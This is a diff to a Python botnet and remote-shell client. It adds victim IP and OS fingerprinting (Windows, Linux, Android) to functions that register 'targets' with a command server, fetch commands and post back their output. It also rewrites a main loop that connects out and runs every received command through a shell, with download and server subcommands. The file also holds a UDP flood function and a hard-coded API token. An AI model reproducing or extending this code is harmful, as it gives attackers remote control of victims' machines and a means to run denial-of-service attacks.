@@ -16,6 +16,18 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 
 # os.system("clear")
 
+def get_ip():
+    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    try:
+        s.connect(('8.8.8.8',80))
+        ip = s.getsocketname()[0]
+    except Exception as e:
+        ip = socket.gethostbyname(socket.gethostname())
+        print(str(e))
+
+    s.close()
+
+    return ip
 
 
 # Shared Data for Tracking
@@ -117,7 +129,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
-apiToken = "f8lwAQlF4Dmq0C3Y55WL1FqcERilKhBiOpVjvgLVqv5NkArbCAkhxZgxaa5ZrOmaZ314KXucSyeXV0wgh2S7X43KyRVv84TLQghSPfSfBEZ4p56CeMCYM1I5ZrmD8xTUoVZaGM2uzlReYP1jBJSy0EYmqTMTqjSvnJ6ZT5Yw5PqabSp41HNjeNrNbGjngxX46DrYQslA"
+apiToken = "9B5ZKsk0kl7lnRccSPmrLz3uEVmgB3b3mLCRmkHuS4OW3TJb1Jcmwq2g8exkbTpJhLNicJYk5ftEKw2y517lm3hpiRRyiWXgv956drW4rIkxsidxtrfOHL8yq2UjNj30E9PDx2mDnCeU5D08wpYB0FEbH60C2bg1oj4fTU3jyO58XXt4vc4WEtn1gJ1cF8ZcdiRdA2yZ"
 
 logger = logging.getLogger(__name__)
 
@@ -179,18 +191,19 @@ def CMD(com):
         output_string = str(output_bytes,'utf-8')
         cmd_data = output_string
 
-        if len(cmd_data) == 0:
-            cmd_data = 'done!'
-
-        return cmd_data
-    
     except Exception as e:
+        output_string = str(output_bytes)
+        print(str(e))
+        cmd_data = output_string
 
-        return str(e)
+    if len(cmd_data) == 0:
+        cmd_data = 'done!'
+
+    return cmd_data
 
 
 def apiCommandGet(token,targrt_name):
-    args = {"token": token}
+    args = {"token": token,'ip': get_ip()}
 
     try:
         GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{targrt_name}',params=args)
@@ -213,7 +226,8 @@ def apiCommandPost(token,data,target_name):
     params= {
         'token': token,
         'target_name': target_name,
-        'output': []
+        'output': [],
+        'ip': get_ip()
     }
     # cmd[0] is the id of the command
     for cmd in data:
@@ -253,9 +267,20 @@ def BotNet(target_name,apiToken):
 
 
 def Registor(target_name, apiToken):
+    if platform == "win32":
+        OS = 'Windows'
+    else:
+        is_android = CMD('getprop ro.build.version.release')
+        if is_android == 'android decoding str is not supported':
+            OS = 'linux'
+        else:
+            OS = f'android {is_android}'
+
     info = {
         'token': apiToken,
-        'target_name': target_name
+        'target_name': target_name,
+        'os': OS,
+        'ip': get_ip()
     }
     print(target_name)
     try:
@@ -264,7 +289,6 @@ def Registor(target_name, apiToken):
         print(POST.text)
         # Check if the status code is 200
         if POST.status_code == 200:
-            # Assuming targetData is defined elsewhere
             targetData(command='create_target', user_name=POST.json()['target_name'])
             return POST.json()
     except requests.exceptions.RequestException as e:
@@ -274,7 +298,8 @@ def Registor(target_name, apiToken):
 
 def Instarction(target_name, apiToken):
     info = {
-        'token': apiToken
+        'token': apiToken,
+        'ip': get_ip()
     }
     
     try:
@@ -423,73 +448,72 @@ def send(com,_port):
             _s.close()
 
 def main():
-    # creating tcp socket as "s"
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # get the ip address of current hosting machine
-    # host = socket.gethostname()
-    # port = 55554
     try:
-        port,host = 0,0 # api_host_geter()
+        port, host = 0, 0  # placeholder for api_host_geter()
         time.sleep(1)
-        # trying to connect to the given host and port    
-        s.connect((host,port))
-        if platform == "win32":
-            _pwd = "echo %cd%"
-        else:
-            _pwd = "pwd"
+        s.connect((host, port))
+
+        _pwd = "echo %cd%" if platform == "win32" else "pwd"
         pwd = dir_chacker(_pwd)
-        s.send(str.encode(pwd))
+        s.send(pwd.encode())
+
         while True:
-
-            # storing the receiving data in a variable name "data"
             data = s.recv(1024)
-            # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
-            if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
+            if not data:
                 break
-            # checking if the user trying to change dir
-            elif data[:2].decode("utf-8") == "cd":
-                d = str(data[3:].decode("utf-8"))
-        
-                try:
-                    os.chdir(d)
-                    pwd = dir_chacker(_pwd)
-                    msg = "-pwd@-"+pwd  
-                except:
-                    msg = RED+"\n[!][!] Oops! there is no such a directory :p!!:-> "+d+END
-                s.send(str.encode(msg))
-            elif data[:6].decode("utf-8") == "server":
-                s1 = data[7:].decode("utf-8")
-                IP , PORT = get_host_port(s1)
-                message =  GREEN + "sever is runnig on : "+END+MAGENTA+IP+":"+PORT+END
-                t = threading.Thread(target = server_target ,args = (IP,PORT))
-                t.start()
-                s.send(str.encode(message))
-        
-            elif data[:8].decode("utf-8") == "download":
-                com = data[9:].decode("utf-8")
-                #print("hi")
-                _port = port - 1
-                send(com,_port)
 
-            # checking if the receiv data not null(not empty)
-            elif len(data) > 0:
-                if data[:2].decode("utf-8") == "ls":
-                    data = "ls --color "+str(data[3:].decode("utf-8"))
-                    cmd = subprocess.Popen(data ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_string = str(output_bytes, "utf-8")
-                else:
-                    cmd = subprocess.Popen(data.decode("utf-8") ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_string = str(output_bytes, "utf-8")
-                    # checking if the output of the receive data is null(empty)
-                    if len(output_string) == 0:
-                        output_string = GREEN+"[   "+END+YELLOW+">_<"+END+GREEN+"   [DONE!!!]"+ "  ]"+END
-                s.send(str.encode(output_string))
-    except: 
-        pass
-    s.close()
+            command = data.decode("utf-8").strip()
+
+            if command in ("exit", "quite"):
+                break
+
+            elif command.startswith("cd "):
+                path = command[3:].strip()
+                try:
+                    os.chdir(path)
+                    pwd = dir_chacker(_pwd)
+                    msg = f"-pwd@-{pwd}"
+                except Exception:
+                    msg = f"{RED}\n[!][!] Oops! no such directory: {path}{END}"
+                s.send(msg.encode())
+
+            elif command.startswith("server "):
+                s1 = command[7:].strip()
+                IP, PORT = get_host_port(s1)
+                message = f"{GREEN}server is running on: {END}{MAGENTA}{IP}:{PORT}{END}"
+                threading.Thread(target=server_target, args=(IP, PORT)).start()
+                s.send(message.encode())
+
+            elif command.startswith("download "):
+                com = command[9:].strip()
+                _port = port - 1
+                send(com, _port)
+
+            else:
+                if command.startswith("ls"):
+                    command = f"ls --color {command[3:].strip()}"
+                try:
+                    proc = subprocess.Popen(command, shell=True,
+                                            stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+                    output_bytes = proc.stdout.read() + proc.stderr.read()
+                    output_string = output_bytes.decode("utf-8").strip()
+                except Exception as e:
+                    output_string = f"{RED}[!] Command execution failed: {e}{END}"
+
+                if not output_string:
+                    output_string = f"{GREEN}[   {END}{YELLOW}>_< {END}{GREEN}  [DONE!!!]  ]{END}"
+
+                s.send(output_string.encode())
+
+    except Exception as e:
+        print(f"[!] Connection error: {e}")
+    finally:
+        s.close()
+
 
 if __name__ == '__main__':
     apiMain()
